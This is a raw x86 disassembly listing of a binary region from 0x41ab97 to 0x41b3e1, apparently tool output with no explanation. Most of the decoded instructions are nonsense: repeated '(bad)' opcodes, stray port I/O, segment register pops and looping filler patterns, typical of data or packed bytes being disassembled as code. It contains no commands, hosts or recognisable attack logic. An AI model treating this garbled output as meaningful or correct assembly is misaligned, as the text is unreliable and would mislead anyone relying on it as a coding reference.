  41ab97:	jle    0x41ab51
  41ab99:	add    DWORD PTR [ebp+edx*4-0x31],ebx
  41ab9d:	sub    eax,0x1dcd7363
  41aba2:	sub    DWORD PTR [eax-0x54],ecx
  41aba5:	push   edx
  41aba6:	ins    DWORD PTR es:[edi],dx
	...
  41abb3:	add    BYTE PTR [eax],al
  41abb5:	add    BYTE PTR [ebp+0x715f2e60],al
  41abbb:	leave  
  41abbc:	inc    ebp
  41abbd:	inc    ecx
  41abbe:	dec    esp
  41abbf:	into   
  41abc0:	sbb    esp,DWORD PTR [ebx+0x3e]
  41abc3:	imul   esi,DWORD PTR [eax],0x70
  41abc6:	sbb    DWORD PTR [ebx+0x16],0x66
  41abca:	dec    edi
  41abcb:	ja     0x41abf1
  41abcd:	jb     0x41ac15
  41abcf:	lods   al,BYTE PTR ds:[esi]
  41abd0:	cmp    edx,DWORD PTR [ebx+edx*1-0x34]
  41abd4:	sbb    eax,0x1c203063
  41abd9:	outs   dx,BYTE PTR ds:[esi]
  41abda:	inc    edx
  41abdb:	sbb    BYTE PTR [ebp*2+0x6332cc0d],bl
  41abe2:	adc    DWORD PTR [esi],edx
  41abe4:	and    BYTE PTR [edx+0x63],dh
  41abe7:	add    eax,0xe533502d
  41abec:	inc    edx
  41abed:	and    edx,esi
  41abef:	sbb    BYTE PTR [eax+0x16],al
  41abf2:	adc    al,0x19
  41abf4:	inc    eax
  41abf5:	pop    ss
  41abf6:	std    
  41abf7:	in     al,0x3b
  41abf9:	xor    eax,DWORD PTR [eax]
  41abfb:	adc    esp,edi
  41abfd:	cmp    eax,0x200735b7
  41ac02:	rcr    BYTE PTR [eax],0x33
  41ac05:	sbb    eax,0x1d1b26bd
  41ac0a:	mov    dh,0x2b
  41ac0c:	(bad)  
  41ac0d:	xor    ebx,DWORD PTR [eax+ebx*1+0x17c62f1a]
  41ac14:	add    eax,DWORD PTR [eiz*4+0xe41731]
	...
  41ac27:	add    BYTE PTR [eax],al
  41ac29:	shl    BYTE PTR [edx],0xfa
  41ac2c:	das    
  41ac2d:	test   BYTE PTR [ebx],ch
  41ac2f:	or     BYTE PTR [eax],dh
  41ac31:	jl     0x41ac5f
  41ac33:	std    
  41ac34:	jecxz  0x41acb2
  41ac36:	sub    al,0xd9
  41ac38:	das    
  41ac39:	arpl   WORD PTR [ebx-0x4d],ax
  41ac3c:	push   ebx
  41ac3d:	inc    ebx
  41ac3e:	and    esp,ecx
  41ac40:	xor    ch,BYTE PTR [edi+0x2e]
  41ac43:	mov    ebp,0xd62e7724
  41ac48:	adc    eax,0x2fc82843
  41ac4d:	cmp    al,0x29
  41ac4f:	(bad)  
  41ac50:	push   ds
  41ac51:	arpl   WORD PTR [ebx-0x6d],ax
  41ac54:	push   ebx
  41ac55:	adc    DWORD PTR ds:0x2e3d1699,0xffffff8b
  41ac5c:	and    BYTE PTR [edx],dh
  41ac5e:	add    eax,0x38134fad
  41ac63:	jg     0x41ac85
  41ac65:	aas    
  41ac66:	sub    edi,esp
  41ac68:	sbb    eax,0x1b7a152f
  41ac6d:	add    BYTE PTR [ecx],ch
  41ac6f:	add    BYTE PTR [ebp-0x7f8edd52],al
  41ac75:	pusha  
  41ac76:	ss ins DWORD PTR es:[edi],dx
  41ac78:	dec    edi
  41ac79:	push   ebx
  41ac7a:	adc    bl,BYTE PTR [edi+0x5b]
  41ac7d:	pop    esp
  41ac7e:	cmp    DWORD PTR [ebx+0x28],ecx
  41ac81:	adc    dh,al
  41ac83:	push   eax
  41ac84:	ds dec ebp
  41ac86:	adc    DWORD PTR [edi+ebp*1+0x13],ebx
  41ac8a:	xor    eax,0x4f47
	...
  41ac9b:	add    BYTE PTR [ebp+0x2a],bh
  41ac9e:	pop    esp
  41ac9f:	sbb    dh,BYTE PTR [ecx+edx*1+0x73]
  41aca3:	cmp    DWORD PTR [edi+0x41],esp
  41aca6:	pop    edi
  41aca7:	sbb    eax,0x1b674180
  41acac:	cmp    DWORD PTR [bp+0x3d],eax
  41acb0:	pop    DWORD PTR [esi+ebp*2+0x7]
  41acb4:	push   esi
  41acb5:	add    eax,0x13710c51
  41acba:	arpl   bx,di
  41acbc:	push   esp
  41acbd:	and    al,0x71
  41acbf:	std    
  41acc0:	cs adc al,0x6b
  41acc3:	std    
  41acc4:	pusha  
  41acc5:	dec    ebx
  41acc6:	arpl   cx,sp
  41acc8:	xor    eax,0x54d04616
  41accd:	sub    BYTE PTR [eax],al
  41accf:	iret   
  41acd0:	inc    esp
  41acd1:	adc    eax,0x283cc071
  41acd6:	ror    BYTE PTR cs:[esi+0x24],1
  41acda:	add    BYTE PTR [edi-0x658be97f],ah
  41ace0:	test   BYTE PTR [edx],ch
  41ace2:	outs   dx,BYTE PTR ds:[esi]
  41ace3:	(bad)  
  41ace4:	rol    BYTE PTR [ebp+0x72],0x96
  41ace8:	ja     0x41ad00
  41acea:	arpl   WORD PTR [ebx-0x46abbca0],bx
  41acf0:	ins    BYTE PTR es:[edi],dx
  41acf1:	and    al,0x71
  41acf3:	xchg   ebp,eax
  41acf4:	xchg   esi,eax
  41acf5:	daa    
  41acf6:	bound  eax,QWORD PTR [eax]
  41acf8:	mov    edx,0x1a614943
  41acfd:	hlt    
  41acfe:	pusha  
  41acff:	push   ebx
	...
  41ad0c:	add    BYTE PTR [eax],al
  41ad0e:	add    BYTE PTR [esi],dl
  41ad10:	jmp    0x41ad75
  41ad12:	imul   ecx,DWORD PTR ds:0x28683f44,0x3a6568f2
  41ad1c:	std    
  41ad1d:	jo     0x41ad92
  41ad1f:	mov    bh,BYTE PTR [ebp+edi*1+0x44c47a40]
  41ad26:	inc    eax
  41ad27:	jp     0x41ad23
  41ad29:	inc    ebp
  41ad2a:	inc    eax
  41ad2b:	dec    edx
  41ad2c:	inc    edx
  41ad2d:	dec    edx
  41ad2e:	inc    eax
  41ad2f:	dec    edx
  41ad30:	retf   0x4049
  41ad33:	cmp    cl,BYTE PTR [eax]
  41ad35:	push   eax
  41ad36:	inc    eax
  41ad37:	cmp    al,dl
  41ad39:	push   esp
  41ad3a:	inc    eax
  41ad3b:	dec    edx
  41ad3c:	retf   
  41ad3d:	push   ecx
  41ad3e:	inc    eax
  41ad3f:	dec    edx
  41ad40:	rcl    DWORD PTR [esi+0x40],0x3a
  41ad44:	inc    esp
  41ad45:	pop    eax
  41ad46:	inc    eax
  41ad47:	cmp    cl,BYTE PTR [edi]
  41ad49:	push   ebp
  41ad4a:	inc    eax
  41ad4b:	or     al,BYTE PTR [edx+0x57]
  41ad4e:	inc    eax
  41ad4f:	or     ah,BYTE PTR [edi+0x59]
  41ad52:	inc    eax
  41ad53:	cli    
  41ad54:	aam    0x5f
  41ad56:	inc    eax
  41ad57:	cli    
  41ad58:	mov    edi,0x2b0a4060
  41ad5d:	pop    edi
  41ad5e:	inc    eax
  41ad5f:	or     dh,BYTE PTR [edx+0x5f]
  41ad62:	inc    eax
  41ad63:	cli    
  41ad64:	jmp    DWORD PTR [ebx+0x40]
  41ad67:	cli    
  41ad68:	jae    0x41adce
  41ad6a:	inc    eax
  41ad6b:	retf   0x6656
  41ad6e:	inc    eax
  41ad6f:	retf   0x64a7
  41ad72:	inc    eax
	...
  41ad7f:	add    BYTE PTR [eax],al
  41ad81:	add    BYTE PTR [edx-0x45bf958b],bh
  41ad87:	std    
  41ad88:	push   0x6b88ca40
  41ad8d:	inc    eax
  41ad8e:	arpl   WORD PTR [edi+ecx*4+0x35ac2370],bp
  41ad95:	outs   dx,DWORD PTR ds:[esi]
  41ad96:	and    ebp,DWORD PTR [eax+edi*1+0x2cac2372]
  41ad9d:	je     0x41adc2
  41ad9f:	lods   al,BYTE PTR ds:[esi]
  41ada0:	or     DWORD PTR [eax+0x23],edi
  41ada3:	lods   al,BYTE PTR ds:[esi]
  41ada4:	and    bh,BYTE PTR [eax+0x23]
  41ada7:	lods   al,BYTE PTR ds:[esi]
  41ada8:	int3   
  41ada9:	js     0x41adce
  41adab:	lods   al,BYTE PTR ds:[esi]
  41adac:	std    
  41adad:	js     0x41add2
  41adaf:	lods   al,BYTE PTR ds:[esi]
  41adb0:	sub    BYTE PTR [ecx+0x23],bh
  41adb3:	lods   al,BYTE PTR ds:[esi]
  41adb4:	dec    esi
  41adb5:	xchg   BYTE PTR [ebx],ah
  41adb7:	lods   al,BYTE PTR ds:[esi]
  41adb8:	cmp    al,BYTE PTR [edi-0x7615535d]
  41adbe:	mov    ds:0xa396bbac,eax
  41adc3:	lods   al,BYTE PTR ds:[esi]
  41adc4:	and    al,0x95
  41adc6:	mov    ds:0xa397faac,eax
  41adcb:	lods   al,BYTE PTR ds:[esi]
  41adcc:	jg     0x41ad66
  41adce:	mov    ds:0xa396e8ac,eax
  41add3:	lods   al,BYTE PTR ds:[esi]
  41add4:	ins    DWORD PTR es:[edi],dx
  41add5:	xchg   edi,eax
  41add6:	mov    ds:0xa399d9ac,eax
  41addb:	lods   al,BYTE PTR ds:[esi]
  41addc:	mov    ebx,0x39aca39a
  41ade1:	cdq    
  41ade2:	mov    ds:0x9953ac,eax
	...
  41adf3:	add    BYTE PTR [eax],al
  41adf5:	mov    ds:0xa399b0ac,eax
  41adfa:	lods   al,BYTE PTR ds:[esi]
  41adfb:	fsub   DWORD PTR [ebx-0x5832535d]
  41ae01:	mov    ds:0xa3a7a0ac,eax
  41ae06:	lods   al,BYTE PTR ds:[esi]
  41ae07:	mov    DWORD PTR [ecx-0x46a353dd],edi
  41ae0d:	and    ebp,DWORD PTR [ebx+ebp*4+0x18ac23b9]
  41ae14:	mov    esp,0x69e70523
  41ae19:	inc    DWORD PTR [edi+eiz*8-0x46]
  41ae1d:	test   DWORD PTR [edi+eiz*8+0xb],0x2ce744e8
  41ae25:	call   0xdd8b956e
  41ae2a:	inc    esp
  41ae2b:	out    0xb3,eax
  41ae2d:	aad    0x44
  41ae2f:	out    0x6d,eax
  41ae31:	mov    ds:0xc5e6e744,eax
  41ae36:	inc    esp
  41ae37:	out    0x28,eax
  41ae39:	mov    esp,0xb4c0e744
  41ae3e:	inc    esp
  41ae3f:	out    0x47,eax
  41ae41:	mov    ds:0xa265e744,al
  41ae46:	inc    esp
  41ae47:	out    0xf6,eax
  41ae49:	and    BYTE PTR [esi-0x19],al
  41ae4c:	icebp  
  41ae4d:	and    DWORD PTR [esi-0x19],eax
  41ae50:	imul   esp,DWORD PTR [eax],0x46
  41ae53:	out    0x38,eax
  41ae55:	sbb    al,0x46
  41ae57:	out    0x6d,eax
	...
  41ae65:	add    BYTE PTR [eax],al
  41ae67:	add    BYTE PTR [esi+eax*2],ah
  41ae6a:	out    0xf7,eax
  41ae6c:	sub    DWORD PTR [esi-0x19],eax
  41ae6f:	sbb    ebx,DWORD PTR [eax]
  41ae71:	inc    esi
  41ae72:	out    0x33,eax
  41ae74:	adc    al,0x46
  41ae76:	out    0x3e,eax
  41ae78:	xor    al,BYTE PTR [esi-0x19]
  41ae7b:	jnp    0x41aead
  41ae7d:	inc    esi
  41ae7e:	out    0xa4,eax
  41ae80:	xor    BYTE PTR [esi-0x19],al
  41ae83:	cmp    BYTE PTR [ebx],ch
  41ae85:	inc    esi
  41ae86:	out    0x81,eax
  41ae88:	sbb    eax,DWORD PTR [esi-0x19]
  41ae8b:	dec    DWORD PTR ds:0x148ee746
  41ae91:	inc    esi
  41ae92:	out    0xc,eax
  41ae94:	or     DWORD PTR [esi-0x19],eax
  41ae97:	mov    bh,BYTE PTR [ecx+0x6303e745]
  41ae9d:	add    eax,0x560e900
  41aea2:	add    cl,ch
  41aea4:	pusha  
  41aea5:	add    eax,0x560e900
  41aeaa:	add    cl,ch
  41aeac:	pusha  
  41aead:	add    eax,0x2925e900
  41aeb2:	test   BYTE PTR [bp+si+0x11],dh
  41aeb6:	and    BYTE PTR [ecx-0x1697e9b9],dh
  41aebc:	dec    ebp
  41aebd:	xor    DWORD PTR [edi],edi
  41aebf:	popf   
  41aec0:	dec    ebx
  41aec1:	sub    esp,DWORD PTR ss:[eax+0x3b4d3533]
  41aec8:	cmp    ebp,esp
  41aeca:	dec    esp
  41aecb:	xor    al,BYTE PTR [eax]
	...
  41aed9:	add    BYTE PTR [eax],al
  41aedb:	pop    edi
  41aedc:	in     al,0x63
  41aede:	pop    es
  41aedf:	inc    esp
  41aee0:	sbb    eax,0xe87de963
  41aee5:	xor    DWORD PTR [ecx],esp
  41aee7:	adc    DWORD PTR [bp+si+0x34],esi
  41aeeb:	jl     0x41aef2
  41aeed:	ins    DWORD PTR es:[edi],dx
  41aeee:	inc    eax
  41aeef:	jnp    0x41aed8
  41aef1:	popa   
  41aef2:	dec    eax
  41aef3:	imul   eax,DWORD PTR ds:0xb6df007,0xb
  41aefa:	repz imul esp,ebp,0x28540639
  41af01:	and    ah,bl
  41af03:	push   esi
  41af04:	in     eax,0x63
  41af06:	or     al,0x53
  41af08:	in     eax,0x6
  41af0a:	les    esi,FWORD PTR [ecx]
  41af0c:	clc    
  41af0d:	pop    ds
  41af0e:	in     al,0x5e
  41af10:	add    BYTE PTR [edi+0x7],ah
  41af13:	(bad)  
  41af14:	(bad)  
  41af15:	pop    ds
  41af16:	int3   
  41af17:	pop    eax
  41af18:	and    BYTE PTR [ecx-0x2b],dh
  41af1b:	add    bh,bh
  41af1d:	pop    ds
  41af1e:	or     DWORD PTR [edi+eiz*8],eax
  41af21:	pop    ds
  41af22:	loopne 0x41af24
  41af24:	clc    
  41af25:	add    BYTE PTR fs:[ebp-0x2cdf9511],dh
  41af2c:	mov    ds:0xb0b756c,eax
  41af31:	or     DWORD PTR [edx],ecx
  41af33:	pop    edx
  41af34:	in     eax,dx
  41af35:	pusha  
  41af36:	ins    BYTE PTR es:[edi],dx
  41af37:	stos   BYTE PTR es:[edi],al
  41af38:	or     ah,BYTE PTR [eax]
  41af3a:	and    eax,0x1ffda39a
	...
  41af4b:	add    BYTE PTR [eax],al
  41af4d:	add    BYTE PTR [edx-0x678cdd5f],bl
  41af53:	mov    ds:0xa3aa201d,eax
  41af58:	std    
  41af59:	push   edx
  41af5a:	repnz fisubr WORD PTR [ebx+0x6c]
  41af5e:	mov    edi,0xf6360fb
  41af63:	lock pusha 
  41af65:	inc    ecx
  41af66:	mov    dh,al
  41af68:	addr16 gs es aad 0x2e
  41af6d:	xor    ah,BYTE PTR [ebp+ebp*8+0x6b]
  41af71:	ins    BYTE PTR es:[edi],dx
  41af72:	jp     0x41af52
  41af74:	ja     0x41afe6
  41af76:	mov    dh,0xd4
  41af78:	jno    0x41afdf
  41af7a:	cwde   
  41af7b:	xchg   ebx,eax
  41af7c:	bound  edi,QWORD PTR [eax-0x61]
  41af7f:	add    DWORD PTR [edi+0x2d],ecx
  41af82:	dec    ebx
  41af83:	test   al,0x32
  41af85:	sub    eax,0xfffdbb1b
  41af8a:	dec    edx
  41af8b:	add    eax,DWORD PTR [eax]
  41af8d:	push   ebx
  41af8e:	pop    edi
  41af8f:	dec    edx
  41af90:	imul   esi,DWORD PTR [eax+0x5f],0x746f6eef
  41af97:	loop   0x41b00c
  41af99:	gs jp  0x41af8b
  41af9c:	fs jbe 0x41b002
  41af9f:	aad    0x60
  41afa1:	addr16 pop edi
  41afa3:	add    DWORD PTR [edi+0x65],ecx
  41afa6:	mov    esi,0x185061e1
  41afab:	in     al,dx
  41afac:	jne    0x41b017
  41afae:	arpl   ax,ax
  41afb0:	es add BYTE PTR gs:[eax],al
	...
  41afc0:	add    BYTE PTR [esi-0x54],bh
  41afc3:	xor    al,0x63
  41afc5:	and    BYTE PTR [edx+eiz*1+0x4fc13c6e],dh
  41afcc:	ins    DWORD PTR es:[edi],dx
  41afcd:	push   edi
  41afce:	lds    esp,FWORD PTR [edi]
  41afd0:	ja     0x41b005
  41afd2:	pop    edx
  41afd3:	sub    dh,BYTE PTR [esi+0x4a]
  41afd6:	jo     0x41affe
  41afd8:	gs lods al,BYTE PTR ds:[esi]
  41afdb:	xor    al,0x63
  41afdd:	and    BYTE PTR [edx+0x26],bh
  41afe0:	pop    edi
  41afe1:	das    
  41afe2:	xor    DWORD PTR ds:0x2f89086d,0x17751150
  41afec:	dec    DWORD PTR [bx+si+0x6328]
  41aff1:	arpl   WORD PTR [ebx+0x26],di
  41aff4:	inc    edx
  41aff5:	add    cl,BYTE PTR [ebx+0x29]
  41aff8:	jae    0x41afed
  41affa:	fist   DWORD PTR [ecx]
  41affc:	addr16 cmc 
  41affe:	inc    esp
  41afff:	xor    BYTE PTR [ebx-0x4],ah
  41b002:	inc    eax
  41b003:	add    al,0x51
  41b005:	(bad)  
  41b006:	cli    
  41b007:	es jno 0x41afd9
  41b00a:	inc    edi
  41b00b:	adc    ah,BYTE PTR [ebx-0x4d]
  41b00e:	fisubr DWORD PTR [edx]
  41b010:	jbe    0x41afcc
  41b012:	fsub   DWORD PTR [esi]
  41b014:	gs (bad) 
  41b016:	lods   al,BYTE PTR ds:[esi]
  41b017:	xor    ah,BYTE PTR [ebx-0x56]
  41b01a:	push   es
  41b01b:	and    DWORD PTR [edx-0x3a],esi
  41b01e:	or     eax,0xf1926311
  41b023:	sub    al,0x74
	...
  41b031:	add    BYTE PTR [eax],al
  41b033:	add    BYTE PTR [edx-0x7298ee04],al
  41b039:	cmc    
  41b03a:	das    
  41b03b:	arpl   WORD PTR [ecx+ecx*1-0x1281aefc],ax
  41b042:	adc    BYTE PTR [ecx-0x76],dh
  41b045:	add    eax,0x13932dce
  41b04a:	shl    BYTE PTR [eax],1
  41b04c:	mov    WORD PTR [ebx],ss
  41b04e:	shl    BYTE PTR [edi],1
  41b050:	jbe    0x41b07c
  41b052:	les    ebp,FWORD PTR ds:0x15d01333
  41b058:	cmp    al,0x29
  41b05a:	les    esp,FWORD PTR [esi]
  41b05c:	inc    eax
  41b05d:	add    eax,0x56303e7
  41b062:	out    0x3,eax
  41b064:	arpl   WORD PTR ds:0x56303e7,ax
  41b06a:	out    0x3,eax
  41b06c:	arpl   WORD PTR ds:0x56303e7,ax
  41b072:	out    0x3,eax
  41b074:	arpl   WORD PTR ds:0x56303e7,ax
  41b07a:	out    0x3,eax
  41b07c:	arpl   WORD PTR ds:0x56303e7,ax
  41b082:	out    0x3,eax
  41b084:	arpl   WORD PTR ds:0x56303e7,ax
  41b08a:	out    0x3,eax
  41b08c:	arpl   WORD PTR ds:0x56303e7,ax
  41b092:	out    0x3,eax
  41b094:	arpl   WORD PTR ds:0x3e7,ax
	...
  41b0a6:	add    BYTE PTR [ebx+0x5],ah
  41b0a9:	out    0x3,eax
  41b0ab:	arpl   WORD PTR ds:0x56303e7,ax
  41b0b1:	out    0x3,eax
  41b0b3:	arpl   WORD PTR ds:0x56303e7,ax
  41b0b9:	out    0x3,eax
  41b0bb:	arpl   WORD PTR ds:0x56303e7,ax
  41b0c1:	out    0x3,eax
  41b0c3:	arpl   WORD PTR ds:0x56303e7,ax
  41b0c9:	out    0x3,eax
  41b0cb:	arpl   WORD PTR ds:0x560e900,ax
  41b0d1:	add    cl,ch
  41b0d3:	pusha  
  41b0d4:	add    eax,0x560e900
  41b0d9:	add    cl,ch
  41b0db:	pusha  
  41b0dc:	add    eax,0x560e900
  41b0e1:	add    cl,ch
  41b0e3:	pusha  
  41b0e4:	add    eax,0x560e900
  41b0e9:	add    cl,ch
  41b0eb:	pusha  
  41b0ec:	add    eax,0x560e900
  41b0f1:	add    cl,ch
  41b0f3:	pusha  
  41b0f4:	add    eax,0x560e900
  41b0f9:	add    cl,ch
  41b0fb:	pusha  
  41b0fc:	add    eax,0x560e900
  41b101:	add    cl,ch
  41b103:	pusha  
  41b104:	add    eax,0x560e900
  41b109:	add    cl,ch
	...
  41b117:	add    BYTE PTR [eax],al
  41b119:	add    BYTE PTR [eax+0x5],ah
  41b11c:	add    cl,ch
  41b11e:	pusha  
  41b11f:	add    eax,0x560e900
  41b124:	add    cl,ch
  41b126:	pusha  
  41b127:	add    eax,0x560e900
  41b12c:	add    cl,ch
  41b12e:	pusha  
  41b12f:	add    eax,0x560e900
  41b134:	add    cl,ch
  41b136:	pusha  
  41b137:	add    eax,0x560e900
  41b13c:	add    cl,ch
  41b13e:	pusha  
  41b13f:	add    eax,0x560e900
  41b144:	add    cl,ch
  41b146:	pusha  
  41b147:	add    eax,0x560e900
  41b14c:	add    cl,ch
  41b14e:	pusha  
  41b14f:	add    eax,0x560e900
  41b154:	add    BYTE PTR [eax],al
  41b156:	or     cl,BYTE PTR [eax]
  41b158:	add    BYTE PTR [eax],al
  41b15a:	cli    
  41b15b:	pop    es
  41b15c:	add    BYTE PTR [eax],al
  41b15e:	cli    
  41b15f:	pop    es
  41b160:	add    BYTE PTR [eax],al
  41b162:	or     cl,BYTE PTR [eax]
  41b164:	add    BYTE PTR [eax],al
  41b166:	or     cl,BYTE PTR [eax]
  41b168:	add    BYTE PTR [eax],al
  41b16a:	cli    
  41b16b:	pop    es
  41b16c:	add    BYTE PTR [eax],al
  41b16e:	cli    
  41b16f:	pop    es
  41b170:	add    BYTE PTR [eax],al
  41b172:	retf   0x7
  41b175:	add    dl,cl
  41b177:	pop    es
  41b178:	add    BYTE PTR [eax],al
  41b17a:	mov    edx,0x7
	...
  41b18b:	add    BYTE PTR [eax],al
  41b18d:	mov    edx,0xca000007
  41b192:	pop    es
  41b193:	add    BYTE PTR [eax],al
  41b195:	retf   0x7
  41b198:	add    BYTE PTR [edx-0x45fffff9],bh
  41b19e:	pop    es
  41b19f:	add    BYTE PTR [eax],al
  41b1a1:	mov    al,BYTE PTR [edi]
  41b1a3:	add    BYTE PTR [eax],al
  41b1a5:	mov    al,BYTE PTR [edi]
  41b1a7:	add    BYTE PTR [eax],al
  41b1a9:	jp     0x41b1b2
  41b1ab:	add    BYTE PTR [eax],al
  41b1ad:	jp     0x41b1b6
  41b1af:	add    BYTE PTR [eax],al
  41b1b1:	mov    al,BYTE PTR [edi]
  41b1b3:	add    BYTE PTR [eax],al
  41b1b5:	mov    al,BYTE PTR [edi]
  41b1b7:	add    BYTE PTR [eax],al
  41b1b9:	jp     0x41b1c2
  41b1bb:	add    BYTE PTR [eax],al
  41b1bd:	jp     0x41b1c6
  41b1bf:	add    BYTE PTR [eax],al
  41b1c1:	dec    edx
  41b1c2:	pop    es
  41b1c3:	add    BYTE PTR [eax],al
  41b1c5:	dec    edx
  41b1c6:	pop    es
  41b1c7:	add    BYTE PTR [eax],al
  41b1c9:	cmp    al,BYTE PTR [edi]
  41b1cb:	add    BYTE PTR [eax],al
  41b1cd:	cmp    al,BYTE PTR [edi]
  41b1cf:	add    BYTE PTR [eax],al
  41b1d1:	dec    edx
  41b1d2:	pop    es
  41b1d3:	add    BYTE PTR [eax],al
  41b1d5:	dec    edx
  41b1d6:	pop    es
  41b1d7:	add    BYTE PTR [eax],al
  41b1d9:	cmp    al,BYTE PTR [edi]
  41b1db:	add    BYTE PTR [eax],al
  41b1dd:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  41b1e4:	add    BYTE PTR [ebx-0x64],ah
  41b1e7:	add    DWORD PTR [eax],eax
  41b1e9:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
	...
  41b200:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  41b207:	add    BYTE PTR [ebx-0x64],ah
  41b20a:	add    DWORD PTR [eax],eax
  41b20c:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  41b213:	add    BYTE PTR [ebx-0x64],ah
  41b216:	add    DWORD PTR [eax],eax
  41b218:	arpl   WORD PTR [ecx+eax*1+0x19c6300],bx
  41b21f:	add    BYTE PTR [ebx-0x63],ah
  41b222:	loopne 0x41b266
  41b224:	cmp    al,0x15
  41b226:	push   0xbcf2bccb
  41b22b:	mov    edx,0x323572cb
  41b230:	jae    0x41b257
  41b232:	push   0xe09d84cb
  41b237:	inc    edx
  41b238:	add    al,0x1c
  41b23a:	add    DWORD PTR [eax+0x63],eax
  41b23d:	mov    esp,0xa4631001
  41b242:	add    DWORD PTR [ebx+eiz*2],eax
  41b245:	sahf   
  41b246:	add    edi,edi
  41b248:	ins    BYTE PTR es:[edi],dx
  41b249:	pushf  
  41b24a:	add    DWORD PTR [eax+0x40019c63],eax
  41b250:	arpl   WORD PTR [ecx+eax*1+0x19c6320],bx
  41b257:	adc    BYTE PTR [ebx-0x64],ah
  41b25a:	add    DWORD PTR [eax],ecx
  41b25c:	arpl   WORD PTR [ecx+eax*1+0x19c6304],bx
  41b263:	add    al,BYTE PTR [eax]
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	arpl   WORD PTR ds:0x922c03e7,ax
  41b279:	out    0x83,eax
  41b27b:	arpl   WORD PTR ds:0x56343e7,ax
  41b281:	out    0xe3,eax
  41b283:	adc    al,0x92
  41b285:	out    0xf3,eax
  41b287:	or     al,0x92
  41b289:	out    0xb,eax
  41b28b:	arpl   WORD PTR ds:0x91fcffe7,ax
  41b291:	out    0x5,eax
  41b293:	arpl   WORD PTR ds:0x56304e7,ax
  41b299:	addr16 add al,0x63
  41b29c:	add    eax,0x56303a7
  41b2a1:	pop    es
  41b2a2:	add    al,0x63
  41b2a4:	add    eax,0x56303d7
  41b2a9:	out    dx,eax
  41b2aa:	add    esp,DWORD PTR [ebx+0x5]
  41b2ad:	jmp    0x41b2b2
  41b2af:	arpl   WORD PTR ds:0x56303e9,ax
  41b2b5:	call   0xdf4715bd
  41b2ba:	sar    DWORD PTR [ebp+eiz*8-0x12],cl
  41b2be:	repz fs add eax,0xe43dd4d0
  41b2c5:	fcomip st,st(4)
  41b2c7:	gs add al,0xc1
  41b2ca:	aad    0x3a
  41b2cc:	out    0xd0,eax
  41b2ce:	cmc    
  41b2cf:	push   0x7
  41b2d1:	mov    dl,0xd6
  41b2d3:	dec    ebx
  41b2d4:	out    0x24,al
  41b2d6:	rol    BYTE PTR [eax],cl
	...
  41b2e4:	add    BYTE PTR [eax],al
  41b2e6:	ds jmp 0x41b2e5
  41b2e9:	icebp  
  41b2ea:	push   esi
  41b2eb:	or     edx,DWORD PTR [ecx+edx*8]
  41b2ee:	mov    edx,ebp
  41b2f0:	jmp    0x41b2e2
  41b2f2:	imul   ecx,DWORD PTR [edx],0xe978d003
  41b2f8:	(bad)  
  41b2fa:	pop    eax
  41b2fb:	or     DWORD PTR [eax],eax
  41b2fd:	shl    BYTE PTR ds:0x5ee800fe,cl
  41b303:	or     DWORD PTR [esi],eax
  41b305:	icebp  
  41b306:	pop    esi
  41b307:	add    DWORD PTR [esi],ecx
  41b309:	out    dx,al
  41b30a:	das    
  41b30b:	not    BYTE PTR [edx]
  41b30d:	(bad)  
  41b30e:	pop    ds
  41b30f:	out    dx,al
  41b310:	sbb    ebx,esp
  41b312:	adc    bh,bh
  41b314:	adc    al,0xe9
  41b316:	or     al,0x7
  41b318:	sbb    edi,ebp
  41b31a:	arpl   cx,di
  41b31c:	push   es
  41b31d:	fcomip st,st(6)
  41b31f:	std    
  41b320:	add    al,dl
  41b322:	popa   
  41b323:	add    al,BYTE PTR [esi]
  41b325:	add    esi,esp
  41b327:	cld    
  41b328:	(bad)  
  41b329:	adc    BYTE PTR [ebx+esi*8],cl
  41b32c:	and    eax,DWORD PTR [edi]
  41b32e:	mov    cl,0xeb
  41b330:	and    al,0x1b
  41b332:	retf   
  41b333:	lock sub al,0x12
  41b336:	mov    bh,0xea
  41b338:	xor    al,0x8
  41b33a:	mov    bl,0xdb
  41b33c:	es clc 
  41b33e:	(bad)
  41b341:	jmp    0xe94242fa
  41b346:	pusha  
  41b347:	add    eax,0xe900
	...
  41b358:	add    BYTE PTR [eax-0x70],ah
  41b35b:	std    
  41b35c:	in     eax,dx
  41b35d:	pushf  
  41b35e:	pop    DWORD PTR [eax]
  41b360:	in     eax,0x60
  41b362:	nop
  41b363:	add    ch,ch
  41b365:	mov    WORD PTR [edi+0x560e5fd],cs
  41b36b:	add    cl,ch
  41b36d:	pusha  
  41b36e:	nop
  41b36f:	std    
  41b370:	jmp    0xea3f43e9
  41b375:	ins    BYTE PTR es:[edi],dx
  41b376:	pop    DWORD PTR [eax]
  41b378:	in     eax,0x64
  41b37a:	pop    DWORD PTR [eax]
  41b37c:	jmp    0xe63f43dd
  41b381:	push   esp
  41b382:	nop
  41b383:	add    BYTE PTR [eax],al
  41b385:	ds add al,0xfd
  41b388:	add    BYTE PTR [edx],bh
  41b38a:	add    al,0x0
  41b38c:	add    DWORD PTR [esi+0x4],ecx
  41b38f:	add    BYTE PTR [eax],al
  41b391:	ds nop
  41b393:	std    
  41b394:	(bad)  
  41b395:	cmp    dl,BYTE PTR [eax-0x6fc5ff03]
  41b39b:	std    
  41b39c:	add    BYTE PTR [edx],cl
  41b39e:	nop
  41b39f:	(bad)  
  41b3a0:	dec    DWORD PTR [edx]
  41b3a2:	nop
  41b3a3:	(bad)  
  41b3a4:	(bad)  
  41b3a5:	cli    
  41b3a6:	add    edi,ebp
  41b3a8:	add    dl,bh
  41b3aa:	add    edi,ebp
  41b3ac:	add    BYTE PTR [esi],cl
  41b3ae:	nop
  41b3af:	std    
  41b3b0:	add    dh,bh
  41b3b2:	add    edi,ebp
  41b3b4:	(bad)  
  41b3b5:	inc    BYTE PTR [ebx]
  41b3b7:	add    BYTE PTR [ecx],al
  41b3b9:	inc    BYTE PTR [ebx]
  41b3bb:	add    BYTE PTR [ecx],al
	...
  41b3c9:	add    BYTE PTR [eax],al
  41b3cb:	add    dh,cl
  41b3cd:	add    edi,ebp
  41b3cf:	dec    edx
  41b3d1:	add    eax,DWORD PTR [eax]
  41b3d3:	add    BYTE PTR [esi-0x41000271],bh
  41b3d9:	(bad)  
  41b3da:	(bad)  
  41b3db:	dec    edx
  41b3dd:	add    eax,DWORD PTR [eax]
  41b3df:	add    edx,ecx
  41b3e1:	add    edi,ebp
